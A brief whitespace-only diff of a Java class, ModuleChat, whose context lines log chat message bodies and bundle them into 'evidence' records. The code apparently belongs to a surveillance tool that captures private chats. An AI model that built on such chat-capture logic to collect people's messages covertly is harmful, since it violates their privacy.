@@ -71,6 +71,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 	@Override
 	protected void actualStart() {
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualStart)");
 		}
@@ -121,7 +122,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 						+ " : " + message.body);
 			}
 		}
-
+		
 		EvidenceBuilder.atomic(EvidenceType.CHATNEW, items);
 	}
 
